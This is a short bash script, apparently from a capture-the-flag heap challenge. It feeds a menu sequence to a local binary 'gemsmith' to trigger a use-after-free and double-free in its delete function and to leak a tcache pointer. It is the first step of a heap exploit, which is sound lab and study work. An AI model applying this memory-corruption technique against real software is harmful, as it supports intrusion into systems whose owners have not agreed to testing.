#!/bin/bash
# Test double-free via UAF in delete()

echo "=== Testing UAF Double-Free ==="
echo "Op 1: Allocate"
echo "Op 2: Delete (free to tcache, UAF remains)"
echo "Op 3: Show (should show tcache fd)"
echo "Op 4: Delete again (double-free!)"
echo ""

# Create input sequence
# 1 = alloc, 2 = delete, 3 = show
INPUT=$(cat <<'EOF'
1
0
100
AAAA
2
0
3
0
2
0
4
EOF
)

echo "$INPUT" | timeout 3 ./gemsmith 2>&1 | tail -20
